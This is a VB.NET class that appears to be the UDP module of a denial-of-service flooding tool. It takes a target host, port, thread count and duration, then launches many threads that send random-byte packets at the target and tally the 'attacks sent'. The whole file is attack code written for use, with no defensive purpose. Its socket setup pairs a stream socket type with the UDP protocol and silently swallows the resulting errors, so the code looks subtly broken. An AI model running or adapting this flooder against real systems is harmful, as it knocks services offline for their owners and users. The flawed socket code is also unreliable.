Imports System.Text
Imports System.Threading

Public Class UDP
    Private ThreadsEnded = 0
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Port As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private msgLength As Integer
    Public Sub New(ByVal model As UdpModel)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = model.newBaseFloodModel.Host
            Port = model.newUdpVariables.Port
            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
            TimetoAttack = model.newBaseFloodModel.Time
            msgLength = model.newUdpVariables.Length
            Threads = New Thread(ThreadstoUse - 1) {}
            GetFloodsBase().Reset()
            GetFloodsBase().SetMessage("UDP attack started")
            For i As Integer = 0 To ThreadstoUse - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            GetFloodsBase().SetMessage("A UDP Attack is Already Running on " & HostToAttack & ":" & Port.ToString)
        End If
    End Sub

    Private Sub Ended()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            GetFloodsBase().SetMessage("UDP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
            GetFloodsBase().SetEnd()
        End If

    End Sub

    Public Sub Stoped()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            GetFloodsBase().SetMessage("UDP Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)

        Else
            GetFloodsBase().SetMessage("No UDP Attack is Running!")
        End If
    End Sub

    Private Sub DoWork()
        Try
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Dim hostip As Net.IPAddress = Net.IPAddress.Parse(Net.Dns.GetHostAddresses(HostToAttack)(0).ToString())
            Dim hostep As New Net.IPEndPoint(hostip, Port)
            Dim count As Integer = 0
            Dim UploadLength As Integer = msgLength
            Dim DownloadLength As Integer = 0
            Do While (stopwatch.Elapsed < span)
                'FloodBase
                GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + count)
                GetFloodsBase().SetAttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * UploadLength)
                GetFloodsBase().SetAttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * DownloadLength)
                count += 1
                If Config.Variables.Debug Then
                    Console.WriteLine("Count: " & GetFloodsBase.Get_AttackCount() & " Download byte: " & GetFloodsBase.GetAttackDownStrengOnByte() & "->" & GetFloodsBase.GetAttackDownStrengOnByteOnSec() & "/Sec Upload byte: " & GetFloodsBase.GetAttackUpStrengOnByte() & "->" & GetFloodsBase.GetAttackUpStrengOnByteOnSec() & "/Sec")
                End If

                'Worker
                Try
                    Dim random As New Random
                    Dim buffer As Byte() = New Byte(msgLength - 1) {}
                    Dim i As Integer
                    For i = 0 To msgLength - 1
                        buffer(i) = CByte(random.Next(0, 100))
                    Next i
                    Dim udpc
                    udpc = New Net.Sockets.Socket(Net.Sockets.AddressFamily.InterNetwork, Net.Sockets.SocketType.Stream, Net.Sockets.ProtocolType.Udp)
                    udpc.Connect(hostep)
                    udpc.SendTo(buffer, hostep)

                    Dim bytes As Integer = 0
                    Dim sb = New StringBuilder()
                    Dim bytesReceived As Byte() = New Byte(255) {}

                    Do
                        bytes = udpc.Receive(bytesReceived, bytesReceived.Length, 0)
                        sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                    Loop Until bytes > 0

                    If DownloadLength = 0 Then
                        DownloadLength = sb.ToString().Length()
                    End If

                    udpc.Close()
                    Continue Do
                Catch
                    Continue Do
                End Try
            Loop
        Catch : End Try

        Ended()
    End Sub
End Class
